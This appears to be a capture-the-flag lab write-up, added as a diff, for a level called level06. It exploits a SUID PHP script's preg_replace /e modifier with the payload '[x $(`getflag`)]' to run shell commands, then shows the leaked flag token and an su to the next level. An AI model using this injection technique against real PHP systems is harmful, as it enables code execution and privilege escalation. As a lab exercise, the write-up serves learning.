@@ -1,0 +1,37 @@
+ls -la
+ -rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
+ -rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
+
+SUID perms again
+
+cat level06.php 
+ #!/usr/bin/php
+ <?php
+ function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
+ function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
+ $r = x($argv[1], $argv[2]); print $r;
+ ?>
+
+the script calls function x with ($argv[1], $argv[2]) then prints the result
+x reads the content of the file passed in 1st argument and preg_replaces it
+preg_replace(SOURCE, PATTERN, INPUT) used with /e modifier causes the replacement to be evaluated by the language
+/(\[x (.*)\])/ captures anything between "[x " and "]" included
+so a string in the form "[x **ANYTHING**]" will match, and be replaced by y("**ANYTHING**"), which php will try to evaluate
+
+the problem is the quotes,
+"**ANYTHING**" will be interpreted as a string litteral and sent to function y()
+
+y() does nothing unless the string passed contains "." or "@", thus we need the replacement to be in the form "$(`COMMAND`)" so php will consider it a variable and try to expand it, only to find backticks (which are the same as shell_exec("COMMAND"))
+
+echo '[x $(`getflag`)]' > /tmp/getflag
+
+(notice the single quotes so that our shell doesn't run getflag)
+
+./level06 /tmp/getflag
+ PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
+  in /home/user/level06/level06.php(4) : regexp code on line 1
+
+php throws an error, but the no-variable has the name of our flag
+
+su level07
+ password: wiok45aaoguiboiki2tuin6ub
